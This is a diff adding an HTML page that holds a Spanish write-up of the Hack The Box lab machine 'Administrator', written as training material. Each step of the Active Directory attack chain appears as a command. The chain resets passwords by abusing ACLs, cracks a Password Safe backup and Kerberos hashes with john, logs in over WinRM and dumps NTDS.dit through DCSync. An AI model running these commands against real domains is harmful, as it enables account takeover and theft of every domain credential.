@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Administrator HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/administrator/pasted-image-20260303120356.png" alt="Administrator HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Administrator</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>BloodHound</span>
+            <span>GenericAll</span>
+            <span>ForceChangePassword</span>
+            <span>DCSync</span>
+            <span>acl</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Assumed breach</li>
+            <li><code>Movimiento lateral</code>: <code>olivia</code> abusa de <code>GenericAll</code> sobre <code>michael</code></li>
+            <li><code>Movimiento lateral</code>: <code>michael</code> abusa de <code>ForceChangePassword</code> sobre <code>benjamin</code></li>
+            <li><code>Explotación</code>: <code>benjamin</code> accede por <code>FTP</code> como miembro de <code>Share Moderators</code> y descarga <code>Backup.psafe3</code></li>
+            <li><code>Movimiento lateral</code>: <code>emily</code> abusa de <code>GenericWrite</code> sobre <code>ethan</code></li>
+            <li><code>Escalada de Privilegios</code>: <code>ethan</code> obtiene permisos de <code>DCSync</code> sobre el dominio</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <div class="code-card">
+            <pre><code># Credenciales Assumed Breach
+olivia:ichliebedich</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/administrator/pasted-image-20260303150744.png" alt="Administrator HTB" />
+          <div class="code-card">
+            <h3>Recolector BloodHound</h3>
+            <pre><code>bloodhound-python -u olivia -p &#x27;ichliebedich&#x27; -ns 10.129.15.10 -d administrator.htb -c all</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Iniciar BloodHound</h3>
+            <pre><code>sudo neo4j start
+# Como alvarorugu7: 
+bloodhound
+# Olivia GenericAll -&gt; Michael</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Olivia GenericAll Michael</h2>
+          <img class="writeup-image" src="/writeups/assets/administrator/pasted-image-20260303162427.png" alt="Administrator HTB" />
+          <div class="code-card">
+            <h3>Cambiar contraseña de michael</h3>
+            <pre><code>nxc smb 10.129.15.10 -u olivia -p &#x27;ichliebedich&#x27; -M change-password -o USER=michael NEWPASS=&#x27;NewPass123&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/administrator/pasted-image-20260303163119.png" alt="Administrator HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Michael ForceChangePassword Benjamin</h2>
+          <img class="writeup-image" src="/writeups/assets/administrator/pasted-image-20260303163253.png" alt="Administrator HTB" />
+          <div class="code-card">
+            <h3>Cambiar contraseña de benjamin</h3>
+            <pre><code>nxc smb 10.129.15.10 -u michael -p &#x27;NewPass123&#x27; -M change-password -o USER=benjamin NEWPASS=&#x27;NewPass123&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/administrator/pasted-image-20260303163530.png" alt="Administrator HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación Benjamin grupo: Share Moderators</h2>
+          <div class="code-card">
+            <h3>Acceso FTP con Benjamin</h3>
+            <pre><code>ftp administrator.htb
+# benjamin:NewPass123
+# Descargamos un fichero backup
+get Backup.psafe3</code></pre>
+          </div>
+          <p><a href="https://github.com/pwsafe/pwsafe/releases" target="_blank" rel="noreferrer">pwsafe GitHub</a></p>
+          <div class="code-card">
+            <pre><code>pushd ../../Descargas # cd a Descargas
+dpkg -i passwordsafe-debian12-1.23-amd64.deb #Install
+apt --fix-broken install # Solucionar dependencias
+popd # Volver al directorio de trabajo</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Abrir fichero.psafe3</h3>
+            <pre><code>pwsafe Backup.psafe3</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/administrator/pasted-image-20260303171905.png" alt="Administrator HTB" />
+          <div class="code-card">
+            <h3>Fuerza bruta para encontrar la contraseña</h3>
+            <pre><code>pwsafe2john Backup.psafe3 &gt; hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Contraseña: tekieromucho</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Accedemos y leemos la contraseña de Emily</h3>
+            <pre><code>pwsafe Backup.psafe3
+# Contraseña: tekieromucho
+# Credenciales -&gt; emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/administrator/pasted-image-20260303172519.png" alt="Administrator HTB" />
+          <div class="code-card">
+            <h3>Acceso Emily WinRM</h3>
+            <pre><code>evil-winrm -i administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Emily GenericWrite Ethan</h2>
+          <img class="writeup-image" src="/writeups/assets/administrator/pasted-image-20260303174036.png" alt="Administrator HTB" />
+          <div class="code-card">
+            <h3>Generic Write sobre ethan: Agregar flag DONT_REQ_PREAUTH y Solicitar ticket TGT</h3>
+            <pre><code># Asignar a ethan la flag DONT_REQ_PREAUTH
+bloodyAD --host 10.129.15.10 -d administrator.htb -u &#x27;emily&#x27; -p &#x27;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#x27; add uac &#x27;ethan&#x27; -f DONT_REQ_PREAUTH
+# Solicitar ticket TGT del usuario AS-REP Roastable
+impacket-GetNPUsers administrator.htb/ethan -no-pass 2&gt;/dev/null
+# Crackear Hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Credenciales -&gt; ethan:limpbizkit</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Alternativa Generic Write sobre ethan: SPN Ficticio y Solicitar TGS</h3>
+            <pre><code># SPN Ficticio
+bloodyAD --host 10.129.15.10 -d administrator.htb -u &#x27;emily&#x27; -p &#x27;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#x27; set object &#x27;ethan&#x27; servicePrincipalName -v &#x27;http/webserver&#x27;
+# Kerberoasting: Obtener el ticket TGS de lidia
+impacket-GetUserSPNs -dc-ip 10.129.15.10 administrator.htb/&#x27;emily&#x27;:&#x27;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#x27; -request-user &#x27;ethan&#x27;
+# Crackear Hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Credenciales -&gt; ethan:limpbizkit</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Ethan Permisos DCSync sobre el Dominio</h2>
+          <div class="code-card">
+            <h3>Dumpear NTDS.dit</h3>
+            <pre><code>netexec smb 10.129.15.10 -u &#x27;ethan&#x27; -p &#x27;limpbizkit&#x27; --ntds</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/administrator/pasted-image-20260303175244.png" alt="Administrator HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>BloodHound</span>
+            <span>GenericAll</span>
+            <span>ForceChangePassword</span>
+            <span>DCSync</span>
+            <span>acl</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
